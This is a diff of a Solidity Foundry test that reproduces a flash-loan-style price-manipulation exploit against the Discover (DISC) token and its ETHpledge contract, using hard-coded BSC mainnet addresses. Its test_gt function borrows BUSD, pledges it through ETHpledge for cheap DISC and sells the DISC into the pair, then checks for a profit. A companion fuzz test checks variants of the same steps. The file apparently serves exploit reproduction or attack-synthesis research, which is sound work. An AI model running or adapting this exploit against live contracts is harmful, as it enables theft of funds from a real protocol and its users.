@@ -1,249 +1,150 @@
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.0;
-import "./AttackContract.sol";
-import "./Discover.sol";
-import "./ETHpledge.sol";
-import "@utils/QueryBlockchain.sol";
-import "forge-std/Test.sol";
-import {USDT} from "@utils/USDT.sol";
-import {UniswapV2Factory} from "@utils/UniswapV2Factory.sol";
-import {UniswapV2Pair} from "@utils/UniswapV2Pair.sol";
-import {UniswapV2Router} from "@utils/UniswapV2Router.sol";
+import "@utils/Helper.sol";
+import {IETHpledge} from "@interfaces/IETHpledge.sol";
 
-contract DiscoverTestBase is Test, BlockLoader {
-    USDT usdt;
-    Discover disc;
-    UniswapV2Pair pair;
-    UniswapV2Factory factory;
-    UniswapV2Router router;
-    ETHpledge ethpledge;
-    AttackContract attackContract;
-    address owner;
-    address attacker;
-    address usdtAddr;
-    address discAddr;
-    address pairAddr;
-    address factoryAddr;
-    address routerAddr;
-    address ethpledgeAddr;
-    address attackerAddr;
-    uint256 blockTimestamp = 1654501818;
-    uint112 reserve0pair = 19811554285664651588959;
-    uint112 reserve1pair = 12147765912566297044558;
-    uint32 blockTimestampLastpair = 1654497610;
-    uint256 kLastpair = 240657614061763162729453454536640212219454075;
-    uint256 price0CumulativeLastpair = 2745108143450717659830230984376055006264;
-    uint256 price1CumulativeLastpair = 5093292101492579051002459678125122695956;
-    uint256 totalSupplydisc = 99999771592634687573343730;
-    uint256 balanceOfdiscpair = 12147765912566297044558;
-    uint256 balanceOfdiscattacker = 0;
-    uint256 balanceOfdiscdisc = 0;
-    uint256 balanceOfdiscethpledge = 603644007472699128296549;
-    uint256 totalSupplyusdt = 4979997922172658408539526181;
-    uint256 balanceOfusdtpair = 19811554285664651588959;
-    uint256 balanceOfusdtattacker = 4000000000000000000;
-    uint256 balanceOfusdtdisc = 0;
-    uint256 balanceOfusdtethpledge = 17359200000000000000000;
-
-    function setUp() public {
-        owner = address(this);
-        usdt = new USDT();
-        usdtAddr = address(usdt);
-        disc = new Discover();
-        discAddr = address(disc);
-        pair = new UniswapV2Pair(
-            address(usdt),
-            address(disc),
-            reserve0pair,
-            reserve1pair,
-            blockTimestampLastpair,
-            kLastpair,
-            price0CumulativeLastpair,
-            price1CumulativeLastpair
-        );
-        pairAddr = address(pair);
-        factory = new UniswapV2Factory(
-            address(0xdead),
-            address(pair),
-            address(0x0),
-            address(0x0)
-        );
-        factoryAddr = address(factory);
-        router = new UniswapV2Router(address(factory), address(0xdead));
-        routerAddr = address(router);
-        ethpledge = new ETHpledge(
-            address(usdt),
-            address(disc),
-            address(0xdead),
-            address(0xdead),
-            address(pair)
-        );
-        ethpledgeAddr = address(ethpledge);
-        attackContract = new AttackContract();
-        attackerAddr = address(attacker);
-        attacker = address(attackContract);
-        // Initialize balances and mock flashloan.
-        usdt.transfer(address(pair), balanceOfusdtpair);
-        disc.transfer(address(pair), balanceOfdiscpair);
-        usdt.transfer(address(ethpledge), balanceOfusdtethpledge);
-        disc.transfer(address(ethpledge), balanceOfdiscethpledge);
-        usdt.transfer(address(attacker), balanceOfusdtattacker);
+contract DiscoverTestBase is Test, Helper {
+    IERC20 busd = IERC20(0x55d398326f99059fF775485246999027B3197955);
+    IERC20 disc = IERC20(0x5908E4650bA07a9cf9ef9FD55854D4e1b700A267);
+    IUniswapV2Pair pair =
+        IUniswapV2Pair(0x92f961B6bb19D35eedc1e174693aAbA85Ad2425d);
+    IETHpledge ethpledge =
+        IETHpledge(0xe732a7bD6706CBD6834B300D7c56a8D2096723A7);
+    address owner = address(0x8894E0a0c962CB723c1976a4421c95949bE2D4E3);
+    address attacker = address(0x446247bb10B77D1BCa4D4A396E014526D1ABA277);
+    uint256 balanceOfbusdattacker;
+    modifier foray() {
+        _;
     }
 
-    modifier eurus() {
-        _;
+    function setUp() public {
+        balanceOfbusdattacker = busd.balanceOf(attacker);
     }
 
     function printBalance(string memory tips) public {
         emit log_string(tips);
-        emit log_string("Usdt Balances: ");
-        queryERC20BalanceDecimals(
-            address(usdt),
-            address(usdt),
-            usdt.decimals()
+        address[] memory token_addrs = new address[](2);
+        string[] memory token_names = new string[](2);
+        address[] memory user_addrs = new address[](6);
+        string[] memory user_names = new string[](6);
+        token_addrs[0] = address(busd);
+        token_names[0] = "busd";
+        token_addrs[1] = address(disc);
+        token_names[1] = "disc";
+        user_addrs[0] = attacker;
+        user_names[0] = "attacker";
+        user_addrs[1] = address(busd);
+        user_names[1] = "busd";
+        user_addrs[2] = address(disc);
+        user_names[2] = "disc";
+        user_addrs[3] = address(pair);
+        user_names[3] = "pair";
+        user_addrs[4] = address(ethpledge);
+        user_names[4] = "ethpledge";
+        user_addrs[5] = owner;
+        user_names[5] = "owner";
+        queryERC20BalanceBatch(
+            token_addrs,
+            token_names,
+            user_addrs,
+            user_names
         );
-        queryERC20BalanceDecimals(
-            address(disc),
-            address(usdt),
-            disc.decimals()
-        );
-        emit log_string("");
-        emit log_string("Disc Balances: ");
-        queryERC20BalanceDecimals(
-            address(usdt),
-            address(disc),
-            usdt.decimals()
-        );
-        queryERC20BalanceDecimals(
-            address(disc),
-            address(disc),
-            disc.decimals()
-        );
-        emit log_string("");
-        emit log_string("Pair Balances: ");
-        queryERC20BalanceDecimals(
-            address(usdt),
-            address(pair),
-            usdt.decimals()
-        );
-        queryERC20BalanceDecimals(
-            address(disc),
-            address(pair),
-            disc.decimals()
-        );
-        emit log_string("");
-        emit log_string("Ethpledge Balances: ");
-        queryERC20BalanceDecimals(
-            address(usdt),
-            address(ethpledge),
-            usdt.decimals()
-        );
-        queryERC20BalanceDecimals(
-            address(disc),
-            address(ethpledge),
-            disc.decimals()
-        );
-        emit log_string("");
-        emit log_string("Attacker Balances: ");
-        queryERC20BalanceDecimals(
-            address(usdt),
-            address(attacker),
-            usdt.decimals()
-        );
-        queryERC20BalanceDecimals(
-            address(disc),
-            address(attacker),
-            disc.decimals()
-        );
-        emit log_string("");
-        emit log_string("");
-        emit log_string("");
     }
 
     function attackGoal() public view returns (bool) {
-        return usdt.balanceOf(attacker) >= 1e18 + balanceOfusdtattacker;
+        return busd.balanceOf(attacker) >= 1e18 + balanceOfbusdattacker;
     }
 
-    function borrow_usdt_owner(uint256 amount) internal eurus {
-        vm.stopPrank();
-        vm.prank(owner);
-        usdt.transfer(attacker, amount);
-        vm.startPrank(attacker);
-    }
-
-    function payback_usdt_owner(uint256 amount) internal eurus {
-        usdt.transfer(owner, amount);
-    }
-
-    function borrow_disc_owner(uint256 amount) internal eurus {
-        vm.stopPrank();
-        vm.prank(owner);
-        disc.transfer(attacker, amount);
-        vm.startPrank(attacker);
-    }
-
-    function payback_disc_owner(uint256 amount) internal eurus {
-        disc.transfer(owner, amount);
-    }
-
-    function borrow_usdt_pair(uint256 amount) internal eurus {
+    function borrow_busd_pair(uint256 amount) internal foray {
         vm.stopPrank();
         vm.prank(address(pair));
-        usdt.transfer(attacker, amount);
+        busd.transfer(attacker, amount);
         vm.startPrank(attacker);
     }
 
-    function payback_usdt_pair(uint256 amount) internal eurus {
-        usdt.transfer(address(pair), amount);
+    function payback_busd_pair(uint256 amount) internal foray {
+        busd.transfer(address(pair), amount);
     }
 
-    function borrow_disc_pair(uint256 amount) internal eurus {
+    function borrow_disc_pair(uint256 amount) internal foray {
         vm.stopPrank();
         vm.prank(address(pair));
         disc.transfer(attacker, amount);
         vm.startPrank(attacker);
     }
 
-    function payback_disc_pair(uint256 amount) internal eurus {
+    function payback_disc_pair(uint256 amount) internal foray {
         disc.transfer(address(pair), amount);
     }
 
-    function swap_pair_attacker_usdt_disc(
+    function borrow_busd_owner(uint256 amount) internal foray {
+        vm.stopPrank();
+        vm.prank(address(owner));
+        busd.transfer(attacker, amount);
+        vm.startPrank(attacker);
+    }
+
+    function payback_busd_owner(uint256 amount) internal foray {
+        busd.transfer(address(owner), amount);
+    }
+
+    function borrow_disc_owner(uint256 amount) internal foray {
+        vm.stopPrank();
+        vm.prank(address(owner));
+        disc.transfer(attacker, amount);
+        vm.startPrank(attacker);
+    }
+
+    function payback_disc_owner(uint256 amount) internal foray {
+        disc.transfer(address(owner), amount);
+    }
+
+    function swap_pair_attacker_busd_disc(
         uint256 amount,
         uint256 amountOut
-    ) internal eurus {
-        usdt.transfer(address(pair), amount);
+    ) internal foray {
+        busd.transfer(address(pair), amount);
         pair.swap(0, amountOut, attacker, new bytes(0));
     }
 
-    function swap_pair_attacker_disc_usdt(
+    function swap_pair_attacker_disc_busd(
         uint256 amount,
         uint256 amountOut
-    ) internal eurus {
+    ) internal foray {
         disc.transfer(address(pair), amount);
         pair.swap(amountOut, 0, attacker, new bytes(0));
     }
 
-    function swap_ethpledge_attacker_usdt_disc(
+    function swap_ethpledge_attacker_busd_disc(
         uint256 amount,
         uint256 amountOut
-    ) internal eurus {
-        usdt.approve(address(ethpledge), UINT256_MAX);
-        ethpledge.pledgein(amount);
+    ) internal foray {
+        address attacker1 = address(0xAb21300fA507Ab30D50c3A5D1Cad617c19E83930);
+        busd.approve(address(ethpledge), type(uint256).max);
+        ethpledge.pledgein(attacker1, amount);
+        vm.stopPrank();
+        vm.startPrank(attacker1);
+        disc.transfer(attacker, disc.balanceOf(attacker1));
+        vm.stopPrank();
+        vm.startPrank(attacker);
     }
 
     function test_gt() public {
         vm.startPrank(attacker);
-        borrow_disc_owner(24000e18);
+        borrow_busd_owner(19811e18);
         printBalance("After step0 ");
-        swap_pair_attacker_disc_usdt(
-            disc.balanceOf(attacker),
-            pair.getAmountOut(disc.balanceOf(attacker), address(disc))
-        );
+        swap_ethpledge_attacker_busd_disc(2000e18, 1);
         printBalance("After step1 ");
-        swap_ethpledge_attacker_usdt_disc(5000e18, 1);
+        swap_pair_attacker_disc_busd(
+            disc.balanceOf(attacker),
+            (getAmountOut(
+                address(pair),
+                disc.balanceOf(attacker),
+                address(disc)
+            ) * 9) / 10
+        );
         printBalance("After step2 ");
-        payback_disc_owner((24000e18 * 1003) / 1000);
+        payback_busd_owner((19811e18 * 1003) / 1000);
         printBalance("After step3 ");
         require(attackGoal(), "Attack failed!");
         vm.stopPrank();
@@ -259,10 +160,10 @@ contract DiscoverTestBase is Test, BlockLoader {
     ) public {
         vm.startPrank(attacker);
         vm.assume(amt5 >= amt0);
-        borrow_disc_owner(amt0);
-        swap_pair_attacker_disc_usdt(amt1, amt2);
-        swap_ethpledge_attacker_usdt_disc(amt3, amt4);
-        payback_disc_owner(amt5);
+        borrow_busd_owner(amt0);
+        swap_ethpledge_attacker_busd_disc(amt1, amt2);
+        swap_pair_attacker_disc_busd(amt3, amt4);
+        payback_busd_owner(amt5);
         assert(!attackGoal());
         vm.stopPrank();
     }
